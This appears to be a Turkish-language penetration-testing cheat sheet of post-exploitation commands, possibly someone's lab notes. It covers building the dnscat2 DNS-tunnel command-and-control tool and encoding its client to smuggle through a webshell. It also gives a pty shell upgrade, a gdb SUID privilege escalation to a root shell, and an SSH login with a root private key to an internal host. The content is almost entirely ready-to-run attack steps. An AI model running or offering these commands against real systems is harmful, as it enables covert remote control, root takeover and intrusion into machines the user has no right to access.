## dnscat

```bash
# dnscat2 Kurulumu
git clone https://github.com/iagox86/dnscat2
cd dnscat2
make # C kaynak kodlarını derleme -> client/dnscat

# dnscat server derleme
sudo gem install bundler --no-document
sudo bundle install
```

```bash
# Webshell üzerinden sunucuya client'ı kopyalamak için encode etmek
xz -9 dnscat # maksimum sıkıştırma
base64 -w 0 dnscat.xz > encoded.b64

# Enkode edilmiş uygulamayı decode etme
base64 -d encoded.b64 > dnscat.xz
xz -dk dnscat.xz
```

## Web

- Stabil bash kabuk alma
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- SUID ile yetki yükseltme komutu
```bash
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!bash -p' -ex quit
```

- Pseudo-Terminal olsa bile SSH bağlantısı kurma
```bash
ssh -tt -i /root/.ssh/id_rsa_nfs user@nfs.altay.sec
```